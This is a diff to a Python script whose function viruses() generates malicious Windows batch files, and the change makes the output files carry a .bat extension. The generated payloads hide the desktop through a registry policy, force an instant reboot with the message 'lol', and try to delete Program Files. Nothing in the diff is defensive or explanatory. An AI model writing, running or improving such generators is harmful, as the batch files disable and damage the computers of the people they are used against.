@@ -997,19 +997,19 @@ def viruses():
 		def bat1():
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
-			k = open(n,"w",encoding='utf-8')
+			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""@echo off reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul""")
 			k.close()
 		def bat2():
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
-			k = open(n,"w",encoding='utf-8')
+			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
 			k.close()
 		def bat3():
 			os.chdir('batniki')
 			n = str(input('\033[35mИмя вашего батника .bat :'))
-			k = open(n,"w",encoding='utf-8')
+			k = open(n + '.bat',"w",encoding='utf-8')
 			k.write("""del c:Program Files/q""")
 			k.close()
 		def back():
